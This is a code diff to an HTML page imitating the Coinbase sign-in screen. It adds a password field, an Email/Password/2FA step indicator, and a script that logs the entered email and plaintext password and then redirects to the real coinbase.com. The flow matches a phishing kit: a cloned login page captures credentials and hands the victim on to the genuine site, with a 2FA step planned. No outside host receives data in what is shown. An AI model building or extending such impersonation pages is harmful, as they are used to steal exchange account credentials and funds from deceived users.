@@ -65,6 +65,26 @@
             color: white;
         }
 
+        input[type="password"] {
+            width: 90%;
+            padding: 14px;
+            margin: 10px 0;
+            background-color: #0A0B0D;
+            border: 1px solid #24252A;
+            border-radius: 4px;
+            font-size: 14px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            color: white;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #578BFA;
+            box-shadow: 0 0 0 3px rgba(86, 139, 250, 0.15);
+        }
+
         .black-button {
             width: 100%;
             padding: 14px;
@@ -183,6 +203,46 @@
         .signup-link:hover {
             text-decoration: none;
         }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .step {
+            width: 8px;
+            height: 8px;
+            background-color: #42445A;
+            border-radius: 50%;
+            position: relative;
+            cursor: default;
+        }
+
+        .step.active {
+            background-color: #578BFA;
+        }
+
+        .step-indicator-text {
+            position: absolute;
+            top: -25px;
+            font-size: 12px;
+            color: #fff;
+        }
+
+        .first-step-text {
+            left: 0;
+        }
+
+        .second-step-text {
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .third-step-text {
+            right: 0;
+        }
     </style>
 </head>
 <body>
@@ -191,9 +251,23 @@
 
     <div class="login-container">
         <h1>Sign in to Coinbase</h1>
+        <div class="step-indicator">
+            <div class="step active"></div>
+            <div class="step"></div>
+        </div>
+        <div class="step-indicator-text">
+            <span class="first-step-text">Email</span>
+            <span class="second-step-text">Password</span>
+            <span class="third-step-text">2FA</span>
+        </div>
+
         <form id="loginForm">
             <label for="email">Your Email Address</label>
             <input type="email" id="emailInput" placeholder="Your Email Address" required>
+
+            <label for="password">Password</label>
+            <input type="password" id="passwordInput" placeholder="Password" required>
+
             <button type="button" class="black-button">Continue</button>
         </form>
 
@@ -223,14 +297,23 @@
     </div>
 
     <script>
-        const continueButton = document.getElementById('continueButton');
         const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const continueButton = document.querySelector('.black-button');
+        const steps = document.querySelectorAll('.step');
+        const stepTexts = document.querySelectorAll('.step-indicator-text span');
 
         continueButton.addEventListener('click', () => {
             const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
 
             if (!email) {
                 alert('Please enter your email address.');
+                return;
+            }
+
+            if (!password) {
+                alert('Please enter your password.');
                 return;
             }
 
@@ -241,7 +324,26 @@
                 return;
             }
 
+            // Password validation (minimum 8 characters)
+            if (password.length < 8) {
+                alert('Password must be at least 8 characters.');
+                return;
+            }
+
             console.log('Email submitted:', email);
+            console.log('Password submitted:', password);
+
+            // Redirect to Coinbase after successful validation
+            window.location.href = 'https://www.coinbase.com';
+        });
+
+        // Add focus styles to password input
+        passwordInput.addEventListener('focus', function() {
+            this.parentElement.style.outline = '1px solid #578BFA';
+        });
+
+        passwordInput.addEventListener('blur', function() {
+            this.parentElement.style.outline = 'none';
         });
     </script>
 </body>
